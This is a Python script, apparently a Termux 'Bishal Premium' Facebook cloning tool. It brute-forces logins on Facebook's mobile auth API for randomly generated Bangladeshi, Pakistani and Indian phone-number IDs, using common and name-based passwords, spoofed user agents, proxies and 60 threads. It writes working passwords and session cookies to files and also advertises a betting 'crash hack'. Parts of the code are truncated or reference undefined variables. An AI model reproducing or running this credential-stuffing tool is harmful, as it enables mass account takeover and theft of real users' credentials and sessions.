--- START OF FILE Bishal-Premium-v2.py ---

import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
# (gtxx and gt lists remain unchanged, keeping them for brevity)
gtxx=("GT-1015", ... ,"SM-T820") # Truncated for display
gt=("GT-1015", ... ,"SM-T820")   # Truncated for display

try:os.system("")
except:pass
#os.system("git pull")
#os.system("pkg install sox -y")
#os.system("pkg install espeak")
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
from string import *
dateti=str(datetime.now()).split(" ")[0]
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
try: # Reading proxies might fail if the file doesn't exist initially
    proxsi=open('socksku.txt','r').read().splitlines()
except:
    proxsi = [] # Initialize as empty list if file read fails

#----------------------+ USER-AGENT +----------------------#
def ____uax____():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['77.6','163','1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.randint(1320, 2868)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['null','Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three','Wifi','NTA'])
	county_code = random.choice(["en_US", "en_GB", "bn_BD"]) # Added Bengali
	android_version = f"{random.randint(4, 14)}.{random.randint(0, 5)}.{random.randint(1, 5)}" # Updated max Android version
	android_model = random.choice(["Quest 2", "SM-G998B", "iPhone17,2", "A3297", "A3295", "A3084", "A3296", "A2635", "Pixel 7 Pro", "A2631", "A2482", "A2633", "iphone14,5", "iPhone15,4", "A3092", "A3089", "A2846", "A3090", "Infinix X669"]) # Added more models
	#user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/iPhone;FBBD/iphone;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-varm64-v8a;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]" # Changed to Samsung
	return random.choice([user_agent2])
#-----------------------------------------------#
myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
key_file_path = '/data/data/com.termux/files/usr/lib/.bishalkey.txt' # Changed key file name

try:
    generate = open(key_file_path,'r').read()
except:
    getx = open(key_file_path,'w')
    getx.write(myid+idmy)
    getx.close()
MY_KEY = open(key_file_path,'r').read()

def clear(): # Define clear function
    os.system('clear')

class apvroval:
    def check():
        # Make sure this URL points to YOUR approval key file on YOUR GitHub repo
        url = "https://github.com/bishalbhi999/File-Cloning/blob/main/Ra.txt" #<--- YOUR GITHUB RAW FILE URL
        import mechanize
        my_awm = mechanize.Browser()
        my_awm.set_handle_robots(False) # Ignore robots.txt
        my_awm.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        my_awm.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] # Add user agent

        try:
            host = my_awm.open(url)
            # Reading the raw content requires specific handling for GitHub
            # It's better to link directly to the RAW version of the file
            # Example Raw URL: https://raw.githubusercontent.com/bishalbhi999/File-Cloning/main/Ra.txt
            # Let's assume the URL *is* the raw URL for simplicity here.
            # If not, parsing the HTML would be needed.
            check_key = host.read().decode('utf-8') # Decode bytes to string
            if MY_KEY in check_key:
                print(f"{G}[+] Key Approved. Starting Tool...{W}")
                time.sleep(1)
                Main()
            else:
                clear()
                logo() # Show logo first
                print(f"\033[10;97m[\033[92;1m!\033[10;97m] \033[10;91mYour Key Not Approved!{W}")
                print(f"\033[10;97m[\033[92;1m+\033[10;97m] Your Key : \033[10;93m{MY_KEY}{W}")
                print(f"{47*'-'}")
                #print(f'\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mFREE-FIRE-ID CLONING') # Keep or remove as needed
                #print(f'\033[10;97m[\033[92;1m•\033[10;97m] \033[10;92mONLY ACTIVE ID CLONING')
                #print(f'\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mUnActive id Not Allow❌')
                #print(f'\033[10;97m[\033[92;1m•\033[10;97m]\033[10;92m Cp id Login 60%')
                #print(f'\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mWi-fi Working 80%')
                print(f"\033[10;97m[\033[92;1m?\033[10;97m] Press Enter to copy your key and send it to Admin for approval.")
                input('\033[0;97m\033[10;97m[\033[92;1m>\033[10;97m]\33[10;92m Press Enter to Contact Admin on WhatsApp...{W}")
                # Set clipboard command for Termux
                os.system(f'echo "{MY_KEY}" | termux-clipboard-set')
                print(f"\033[10;97m[\033[92;1m+\033[10;97m] Your Key \033[10;93m{MY_KEY}\033[10;92m has been copied to clipboard!{W}")
                time.sleep(1)
                os.system('xdg-open https://wa.me/+8801768856670') # Your WhatsApp number
                print(f"\033[10;97m[\033[92;1m!\033[10;97m] After approval, restart the script.")
                #input('\033[0;97m\033[10;97m[\033[92;1m●\033[10;97m] \33[0;41mKEY COPY AND PRESS ENTER TO SEND ADMIN\033[0;97m') # Commented out redundant input
                #os.system('xdg-open https://wa.me/+8801768856670')
                exit() # Exit after showing approval message
        except Exception as e:
            clear()
            logo()
            print(f"\033[10;91m[!] Error checking approval: {e}")
            print(f"\033[10;91m[!] Please check your internet connection and the approval URL.")
            print(f"\033[10;91m[!] Approval URL: {url}")
            exit()
#-----------------------------------------------------#
#=====Bishal Premium=====#
def bishalx(fx): # Renamed function
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :bishalxz = '2009' # Renamed variable
		elif fx[:9] in ['100000000']       :bishalxz = '2009'
		elif fx[:8] in ['10000000']        :bishalxz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:bishalxz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:bishalxz = '2010'
		elif fx[:6] in ['100001']          :bishalxz = '2010/2011'
		elif fx[:6] in ['100002','100003'] :bishalxz = '2011/2012'
		elif fx[:6] in ['100004']          :bishalxz = '2012/2013'
		elif fx[:6] in ['100005','100006'] :bishalxz = '2013/2014'
		elif fx[:6] in ['100007','100008'] :bishalxz = '2014/2015'
		elif fx[:6] in ['100009']          :bishalxz = '2015'
		elif fx[:5] in ['10001']           :bishalxz = '2015/2016'
		elif fx[:5] in ['10002']           :bishalxz = '2016/2017'
		elif fx[:5] in ['10003']           :bishalxz = '2018/2019'
		elif fx[:5] in ['10004']           :bishalxz = '2019'
		elif fx[:5] in ['10005']           :bishalxz = '2020'
		elif fx[:5] in ['10006','10007','10008']:bishalxz = '2021/2022'
		else:bishalxz='2023'
	elif len(fx) in [9,10]:
		bishalxz = '2008/2009'
	elif len(fx)==8:
		bishalxz = '2007/2008'
	elif len(fx)==7:
		bishalxz = '2006/2007'
	else:bishalxz='2023/2024'
	return bishalxz
#============Time===========#
B = '\x1b[1;90m' # Dark Gray
R = '\x1b[1;91m' # Red
G = '\x1b[1;92m' # Green
H = '\x1b[1;93m' # Yellow
BL = '\x1b[1;94m' # Blue
BG = '\x1b[1;95m' # Magenta
S = '\x1b[1;96m' # Cyan
W = '\x1b[1;97m' # White
N = '\x1b[0m' # Reset/Normal

# Corrected background/foreground combos if needed - using standard foreground bright colors
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
N = '\033[0m' # Use standard reset code
E = N # Alias for reset

#=====Bishal Premium=====#
ugen=[]
ugtn=[]
ugxn=[]
# xxxxx list remains unchanged
xxxxx=("GT-1015", ... ,"SM-T820") # Truncated for display
# fbks list remains unchanged
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

#=====Globals=====#
dt="•"
# id # This global variable named 'id' is problematic, rename or remove if not essential
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
version="2.1" # Version updated as per screenshot

class t:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.020) # Slightly faster typing effect

def line(char="="):
	print(f"{S}{char*47}{N}") # Use Cyan color for lines

BDX=f"{W}[{G}+{W}] {G}BD SIM CODE {R}• {G}013 014 015 016 017 018 019{N}"
INDX=f"{W}[{G}+{W}] {G}IND SIM CODE {R}: {G}9670 9725 8948 8795 6383{N}"
PAKX=f"{W}[{G}+{W}] {G}PAK SIM CODE {R}: {G}0306 0315 0335 0345 0318{N}"
LIMITX=f"{W}EXAMPLE {R}: {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{N}"
#=====Bishal Premium=====#
CPG=f"{W}[{G}?{W}] Show Checkpoint (CP) Accounts (y/n):{N}"
CKIG=f"{W}[{G}?{W}] Show Cookies for OK Accounts (y/n):{N}"
chc=f'{W}[{G}>{W}] {G}Choose {R}•{G} '
flp=f"{W}[{G}•{W}] Input File Path {R}: {G}"
chcps=f'{W}EXAMPLE{R}: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
# mxxt is not used, can be removed
# mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
nflp=f"[{R}!{W}] File Not Found! "

os.system('clear')
############------[ LOGO ]------#########
#os.system('espeak -a 300 " Welcome to Bishal Premium Tools"') # Changed Name

def logo():
    log = f"""{G}
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║{G}   ____  _  _  ____  __  __    ____   ____   _  _  {G}║
║{G}  (  _ \( \/ )( ___)(  )(  )  (  _ \ (  _ \ ( \/ ) {G}║
║{G}   )___/ \  /  )__)  )(__)(    )___/  )   / / \/ \ {G}║
║{G}  (__)   (__) (____)(______)  (__)   (_)\_) \_)(_/ {G}║
{G}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
{S}╔═════════════════════════════════════════════════╗
║{R}•••••••>{W}[ {G}WORKING WIFI {W}& {G}MOBILE DATA {W}] {R}<•••••••║
{S}╚═════════════════════════════════════════════════╝
{BL}╔═════════════════════════════════════════════════╗{H}
{BL}║ {W}[AUTHOR]   {R}• {G}MR-BISHAL         {BL}║{H}
{BL}║ {W}[FACEBOOK] {R}• {G}Bishal premium    {BL}║{H}
{BL}║ {W}[GITHUB]   {R}• {G}bishalbhi999      {BL}║{H}
{BL}║ {W}[WHATSAPP] {R}• {G}01768856670       {BL}║{H}
{BL}║ {W}[TOOLS]    {R}• {G}FREE              {BL}║{H}
{BL}║ {W}[VERSION]  {R}• {G}{version:<18}{BL}║{H}
{BL}║ {W}[KEY]{R}: {H}{MY_KEY} {BL}║{H}
{BL}╚═════════════════════════════════════════════════╝{N}"""
    print(log)


def Main():
    clear()
    logo()
    print(f'{S}╔═══════════════════[{G} MAIN MENU {S}]══════════════════╗')
    print(f'{S}║ {W}[{G}1{W}] {G}RANDOM CLONE {W}[{G}BD{W}]                      {S}║')
    print(f'{S}║ {W}[{G}2{W}] {G}RANDOM CLONE {W}[{BG}PAK{W}]                     {S}║')
    print(f'{S}║ {W}[{G}3{W}] {G}RANDOM CLONE {W}[{BL}INDIA{W}]                   {S}║')
    print(f'{S}║ {W}[{G}4{W}] {H}1XBET CRASH HACK {W}(Contact Admin)      {S}║')
    print(f'{S}║ {W}[{G}5{W}] {S}CONTACT ADMIN {W}(Whatsapp/FB)         {S}║')
    print(f'{S}║ {W}[{R}0{W}] {R}EXIT TOOL                          {S}║')
    print(f'{S}╚═════════════════════════════════════════════════╝')
    ghx=input(f'{chc}')
    if ghx in ["1", "01"]: rcd.clear(); rcd.append('1'); rmenu1()
    elif ghx in ["2", "02"]: rcd.clear(); rcd.append('2'); rmenu1()
    elif ghx in ["3", "03"]: rcd.clear(); rcd.append('3'); rmenu1()
    elif ghx in ["4", "04"]: rcd.clear(); rcd.append('4'); rmenu1()
    elif ghx in ["5", "05"]: rcd.clear(); rcd.append('5'); rmenu1()
    elif ghx in ["0", "00"]: rcd.clear(); rcd.append('0'); rmenu1()
    else: line('!'); print(f'{R}[!] Invalid Option Selected{N}'); time.sleep(1); Main()

def rmenu1():
    clear()
    logo()
    rcd_val = rcd[0] if rcd else '0' # Get the selected option safely

    if rcd_val == "1": print(f"{BDX}"); line()
    elif rcd_val == "2": print(f"{PAKX}"); line()
    elif rcd_val == "3": print(f"{INDX}"); line()
    elif rcd_val == "4":
        print(f"{W}[{H}!{W}] {H}This Feature Requires Admin Contact.{N}");
        print(f"{W}[{G}+{W}] {G}Contact Admin on WhatsApp for details.{N}");
        os.system('xdg-open https://wa.me/+8801768856670'); time.sleep(2); Main() # Back to main menu
    elif rcd_val == "5":
        print(f"{W}[{G}+{W}] {G}Opening Admin Contact Options...{N}");
        print(f"{W}[{G}1{W}] {G}Contact on WhatsApp{N}");
        print(f"{W}[{G}2{W}] {G}Contact on Facebook{N}");
        print(f"{W}[{R}0{W}] {R}Back to Main Menu{N}");
        c_choice = input(f"{chc}")
        if c_choice == '1': os.system('xdg-open https://wa.me/+8801768856670')
        elif c_choice == '2': os.system('xdg-open https://www.facebook.com/bishal.premium') # Your FB Link
        time.sleep(2); Main() # Go back to main menu regardless
    elif rcd_val == "0": print(f"{R}[!] Exiting Tool...{N}"); time.sleep(1); exit()
    else: print(f"{R}[!] Invalid State. Returning to Main Menu...{N}"); time.sleep(2); Main() # Should not happen

    # --- If cloning option was selected (1, 2, 3) ---
    if rcd_val in ["1", "2", "3"]:
        code = input(f'{chc}Enter Sim Code {R}:{G} ')
        if not code.isdigit():
            line('!'); print(f"{R}[!] Please enter digits only for Sim Code.{N}"); time.sleep(2); rmenu1(); return
        line()
        print(f'{LIMITX}'); line()
        try:
            limit = int(input(f'{W}[{G}?{W}] Crack Limit {R}:{G} '))
            if limit <= 0: raise ValueError()
        except ValueError:
            line('!'); print(f'{R}[!] Please enter a positive number for limit.{N}'); time.sleep(2); rmenu1(); return
        line('-');
        print(f'{CPG}')
        cx = input(f'{chc}').lower()
        cpx.clear()
        if cx in ['y', 'yes', '1']: cpx.append('y')
        else: cpx.append('n')
        line('-');
        print(f'{CKIG}')
        ckiv = input(f'{chc}').lower()
        cokix.clear()
        if ckiv in ['y', 'yes', '1']: cokix.append('y')
        else: cokix.append('n')
        line('-')

        # --- Clear lists for new run ---
        xode.clear()
        ok.clear()
        cp.clear()
        twf.clear()
        global lop
        lop = 0
        lk.clear() # Clear lk list too

        # --- Generate IDs ---
        for number in range(limit):
            digits_needed = 8 if rcd_val == "1" else (7 if rcd_val == "2" else 6)
            numberx = ''.join(random.choice(string.digits) for _ in range(digits_needed))
            xode.append(numberx)

        # --- Start Cracking ---
        with ThreadPool(max_workers=60) as bishal_pool: # Changed pool name
            tid = str(len(xode)) # Total IDs
            clear()
            logo()
            # --- Cracking Header ---
            print(f'{S}╔═══════════════════[{G} CRACKING INFO {S}]══════════════════╗')
            print(f'{S}║ {W}[{G}+{W}] {G}USER NAME      {R}: {H}{NameX}{N} {" "*(21-len(NameX))}{S}║')
            print(f'{S}║ {W}[{G}+{W}] {G}TOTAL IDs      {R}: {H}{tid}{N}{" "*(21-len(tid))}{S}║')
            print(f'{S}║ {W}[{G}+{W}] {G}SIM CODE       {R}: {H}{code}{N}{" "*(21-len(code))}{S}║')
            print(f'{S}║ {W}[{G}+{W}] {G}STARTED        {R}: {H}{dateti}{N}{" "*(21-len(dateti))}{S}║')
            print(f'{S}║ {W}[{G}+{W}] {G}SHOW CP        {R}: {H}{"Yes" if "y" in cpx else "No"}{N}{" "*18}{S}║')
            print(f'{S}║ {W}[{G}+{W}] {G}SHOW COOKIE    {R}: {H}{"Yes" if "y" in cokix else "No"}{N}{" "*18}{S}║')
            print(f'{S}║ {W}[{H}!{W}] {H}USE AIRPLANE MODE {R}[{G}ON{R}/{G}OFF{R}] {H}FOR SPEED UP!{N} {S}║')
            print(f'{S}╚═════════════════════════════════════════════════╝')

            for rngx in xode:
                uid = code + rngx # User ID to crack
                # --- Define Passwords based on region ---
                psd = []
                first_name_lower = NameX.split(' ')[0].lower() if ' ' in NameX else NameX.lower()
                last_name_lower = NameX.split(' ')[-1].lower() if ' ' in NameX else ''

                if rcd_val == "1": # BD Passwords
                    psd = [
                        uid, rngx, uid[3:], uid[4:], uid[5:], # Number variations
                        'bangladesh', 'Bangladesh', '123456', '1234567', '12345678', '123456789',
                        first_name_lower + '123', first_name_lower + '12345',
                    ]
                    if last_name_lower: psd.append(last_name_lower + '123')

                elif rcd_val == "2": # PAK Passwords
                    psd = [
                        uid, rngx, uid[4:], uid[5:], # Number variations
                        'pakistan', 'Pakistan', 'khan123', 'khan12345', 'ali123', 'ali12345',
                        '786786', '123456', '123456789', '112233',
                         first_name_lower + '123', first_name_lower + '12345', 'khan'
                    ]
                    if last_name_lower: psd.append(last_name_lower + '123')


                elif rcd_val == "3": # INDIA Passwords
                    psd = [
                        uid, rngx, uid[4:], uid[5:], # Number variations
                        'india', 'India', 'hindustan', '123456', '1234567', '12345678', '123456789',
                        '57273200', '59273200', 'freefire', 'pubgindia',
                        first_name_lower + '123', first_name_lower + '12345',
                    ]
                    if last_name_lower: psd.append(last_name_lower + '123')

                bishal_pool.submit(graphrm, uid, psd, tid) # Submit to thread pool

        # --- Cracking Finished ---
        line('=')
        print(f'{W}[{G}✓{W}] {G}CRACKING FINISHED...')
        print(f'{W}[{G}+{W}] Total OK IDs : {G}{len(ok)}{N}')
        print(f'{W}[{G}+{W}] Total CP IDs : {H}{len(cp)}{N}')
        print(f'{W}[{G}+{W}] OK IDs saved in : {G}/sdcard/Bishal-OK.txt{N}')
        print(f'{W}[{G}+{W}] CP IDs saved in : {H}/sdcard/Bishal-CP.txt{N}')
        line('=')
        input(f'{W}[ Press Enter To Go Back To Main Menu ]{N}')
        Main()


lk=[] # This list seems unused, maybe remove?
def graphrm(uid, psd, tid): # Changed parameter name from 'id' to 'uid'
	global ok, cp, lk, lop
	togg = []
    # Updated status line
	sys.stdout.write(f'\r{S}[Bishal-M1]{W} [{G}{lop}{W}/{tid}] {R}• {G}OK:{len(ok)} {R}• {H}CP:{len(cp)} {R}• {BL}2F:{len(twf)}{N}   ')
	sys.stdout.flush()
	try:
		for psw in psd:
			ua = ____uax____() # Use the function to get a dynamic UA
			adid = str(uuid.uuid4())
			device_id = str(uuid.uuid4())
			family_device_id = str(uuid.uuid4())

			datax= {
				'adid': adid,
				'format': 'json',
				'device_id': device_id,
				'email': uid,
				'password': psw,
				'generate_analytics_claims': '1',
				'community_id': '',
				'cpl': 'true',
				'try_num': '1',
				'family_device_id': family_device_id,
				'credentials_type': 'password',
				'source': 'login',
				'error_detail_type': 'button_with_disabled',
				'enroll_misauth': 'false',
				'generate_session_cookies': '1',
				'generate_machine_id': '1',
				'currently_logged_in_userid': '0',
				'locale': 'en_US', # Changed locale
				'client_country_code': 'US', # Changed country code
				'fb_api_req_friendly_name': 'authenticate',
				'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'api_key': '882a8490361da98702bf97a021ddc14d' # Common API key
			}
			header={
				'User-Agent': ua,
				'Content-Type': 'application/x-www-form-urlencoded',
				'Host': 'graph.facebook.com', # Use graph endpoint
				'X-FB-Net-HNI': str(random.randint(20000, 40000)),
				'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
				'X-FB-Connection-Type': 'MOBILE.LTE',
				'X-Tigon-Is-Retry': 'False',
				'x-fb-session-id': f'nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,999)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}',
				'x-fb-device-group': str(random.randint(2000, 6000)),
				'X-FB-Friendly-Name': 'authenticate',
				'X-FB-Request-Analytics-Tags': 'graphservice',
				'X-FB-HTTP-Engine': 'Liger',
				'X-FB-Client-IP': 'True',
				'X-FB-Server-Cluster': 'True',
				'x-fb-connection-token': uuid.uuid4().hex,
				'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32' # Token
			}

			po = requests.post('https://graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False)
			lo = po.json() # Parse JSON response

			if 'session_key' in lo:
				coki = ";".join(f"{key}={value}" for key, value in po.cookies.get_dict().items())
				iid = lo.get("uid", uid)
				print(f'\r\r{G}[Bishal-OK💚] {iid} | {psw} {S}[{bishalx(str(iid))}]{N}') # Used bishalx
				#os.system('espeak -a 200 "Bishal, Okay Id"') # Optional espeak
				ok.append(iid) # Append OK UID
				open('/sdcard/Bishal-OK.txt', 'a').write(f"{iid}|{psw}|{coki}\n") # Changed filename and format
				if 'y' in cokix: print(f'{S}[🍪]COOKIES • {H}{coki}{N}')
				break # Exit inner loop after finding OK

			elif 'www.facebook.com' in lo.get('error', {}).get('message', ''):
				iid = lo.get('error', {}).get('error_data', {}).get('uid', uid)
				if iid not in ok and iid not in cp and iid not in twf: # Check if not already found
					if 'y' in cpx:
						print(f'\r\r{H}[Bishal-CP💔] {iid} | {psw}{N}') # Changed prefix
						#os.system('espeak -a 200 "Checkpoint"') # Optional espeak for CP
						cp.append(iid) # Append CP UID
						open('/sdcard/Bishal-CP.txt', 'a').write(f"{iid}|{psw}\n") # Changed filename
						break # Exit inner loop after finding CP

			elif 'Calls to this api have exceeded the rate limit' in str(lo):
                 # Handle rate limit slightly differently - maybe pause or log
                 # print(f"\r{R}[!] Rate Limit Hit. Pausing for 5s...{N}")
                 time.sleep(5) # Pause briefly
                 # Don't break, just continue to next password or ID after pause

			elif 'login approval' in str(lo).lower() or 'confirmation code' in str(lo).lower():
			    iid = lo.get('error', {}).get('error_data', {}).get('uid', uid)
			    if iid not in ok and iid not in cp and iid not in twf:
			         print(f'\r\r{BL}[Bishal-2F🔐] {iid} | {psw}{N}'); # Changed prefix
			         #os.system('espeak -a 200 "Two Factor"') # Optional espeak for 2F
			         twf.append(iid) # Append 2F UID
			         open('/sdcard/Bishal-2F.txt', 'a').write(f"{iid}|{psw}\n") # Changed filename
			         break # Exit inner loop after finding 2F

			else: continue # Continue to next password if no match

	except requests.exceptions.RequestException as e:
		# Handle connection errors, timeouts, etc. more gracefully
		# print(f"\n[!] Network Error: {e}. Retrying ID {uid}...")
		time.sleep(random.uniform(5, 10)) # Wait longer before potentially retrying
		# graphrm(uid, psd, tid) # Optionally retry the same ID - risky, might cause infinite loop

	except Exception as e:
		# Handle other unexpected errors
		# print(f"\n[!] An unexpected error occurred: {e}")
		time.sleep(1) # Short pause for unexpected errors

	lop+=1


if __name__ == "__main__":
    clear()
    logo()
    t(f'{G}[+] Initializing BISHAL BHi Premium Tool...{N}')
    time.sleep(1)
    t(f'{G}[+] Checking Key Approval...{N}')
    apvroval.check() # Start the approval check and then the main logic

--- END OF FILE Bishal-Premium-v2.py ---